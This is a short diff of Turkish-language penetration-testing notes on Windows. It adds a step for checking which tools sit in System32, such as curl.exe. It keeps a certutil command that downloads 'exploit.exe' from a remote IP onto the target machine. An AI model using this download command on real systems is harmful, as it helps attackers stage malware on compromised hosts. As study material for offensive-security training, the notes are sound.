@@ -1,4 +1,25 @@
-Windowsun içine başka sunucudan veri aktarımını yapar
+
+### Sistemde hangi dosyaları kullanabiliriz kontrol etmek için aşağıdaki dizini listeleyiniz
+
+mesela curl kullanabiliyormusun ?
+
+**example**
+
+```powershell
+
+C:\Windows\System32\
+
+```
+yada
+
+```powershell
+
+C:\Windows\System32\curl.exe
+
+```
+---
+
+### Windowsun içine başka sunucudan veri aktarımını yapar
 ```bash
 C:\> certutil -urlcache -f http://10.9.6.1:80/exploit.exe exploit.exe
 
